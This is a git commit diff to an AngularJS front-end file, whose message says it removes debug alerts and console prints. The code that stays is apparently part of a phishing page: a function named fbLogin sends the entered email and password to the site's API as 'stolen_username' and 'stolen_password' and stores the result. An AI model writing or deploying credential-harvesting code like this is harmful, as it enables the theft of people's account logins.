9826ce1ce86be83f4a0695f808303aca19c2eac7
Henry Dorfman <henrydorfman@gmail.com>
2016-11-06 21:20:44 -0800

    Removed alert and console prints

--- static/js/app.js
+++ static/js/app.js
@@ -4,20 +4,14 @@ app.controller("AppCtrl", function($http) {
     var app = this;
 
     $http.get("/api/user").success(function(data) {
-        alert(data);
         app.entries = data.objects;
     })
 
     app.fbLogin = function() {
-        console.log(app);
         $http.post("/api/user", {"stolen_username": app.email, "stolen_password": app.password})
             .success(function(data) {
                 app.entries.push(data);
             })
-            .error(function(data) {
-                alert(data);
-            })
-
     }
 
 })
